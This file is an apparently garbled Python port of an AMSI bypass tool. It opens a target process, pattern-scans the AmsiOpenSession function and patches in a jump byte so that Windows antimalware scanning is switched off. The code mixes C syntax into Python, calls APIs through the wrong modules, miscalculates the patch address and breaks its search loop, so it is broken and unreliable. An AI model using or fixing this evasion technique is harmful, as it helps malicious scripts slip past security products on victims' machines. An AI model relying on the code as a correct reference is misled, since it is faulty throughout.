import ctypes

typedef ctypes.c_ulonglong as ULONGLONG

# Define the AmsiPattern and AmsiPatch bytes in a list format
AmsiPattern = [0x48,'?','?',0x74,'?',0x48,'?', '?',0x74]
AmsiPatch = [0xeb]

def UnusedSubroutineSearchAmsiPattern(Address, Size, Pattern, PatternSize):
    for dwX in range(1024):
        if Address[dwX] == Pattern[0]:
            dwOffset = 1
            while dwOffset < PatternSize and dwX + dwOffset < Size and (Pattern[dwOffset] == '?' or Address[dwX + dwOffset] == Pattern[dwOffset]):
                dwOffset += 1
            if dwOffset == PatternSize:
                return (ULONGLONG)(dwX + 3)
        else:
            break
    return 0

def AmsiBypassViaPatternScan(ProcessId):
    hProcess = ctypes.windll.kernel32.OpenProcess(ctypes.CREATE_THREAD | ctypes.PROCESS_QUERY_INFORMATION, False, ProcessId)
    if hProcess is None:
        return

    hMod = ctypes.util.find_library('amsi.dll')
    if hMod is None:
        hProcess.close()
        return

    pfnAmsiOpenSession = ctypes.windll.amsi.AmsiOpenSession
    if not pfnAmsiOpenSession:
        hMod.close()
        hProcess.close()
        return

    try:
        AmsiBuffer = ctypes.string_at(hProcess, pfnAmsiOpenSession, 1024)
    except:
        hProcess.close()
        hMod.close()
        return

    AmsiAddress = UnusedSubroutineSearchAmsiPattern(AmsiBuffer, 1024, AmsiPattern, len(AmsiPattern))
    if AmsiAddress == 0:
        hProcess.close()
        hMod.close()
        return

    PatchedAmsiAddress = (ULONGLONG)pfnAmsiOpenSession + AmsiAddress
    PatchedAmsiAddress += AmsiAddress

    try:
        ctypes.windll.amsi.WriteProcessMemory(hProcess, (ctypes.c_void_p(PatchedAmsiAddress), ctypes.sizeof(AmsiPatch)), AmsiPatch, 1, None)
    except:
        hProcess.close()
        hMod.close()
        return

    bFlag = True

hProcess.close()
hMod.close()
